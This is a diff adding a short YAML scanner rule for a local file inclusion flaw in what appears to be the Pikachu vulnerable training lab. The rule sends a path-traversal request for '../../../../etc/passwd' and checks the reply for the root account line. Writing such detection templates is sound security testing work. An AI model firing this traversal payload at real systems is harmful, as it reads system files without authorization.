@@ -1,0 +1,9 @@
+name: fileinclude-local-pikachu-get
+type: LFI
+rules:
+  - method: GET
+    path: vul/fileinclude/fi_local.php?filename=../../../../etc/passwd&submit=提交
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    expression: result.contains("root:x:0:0:root:/root")
+author: ch4ser
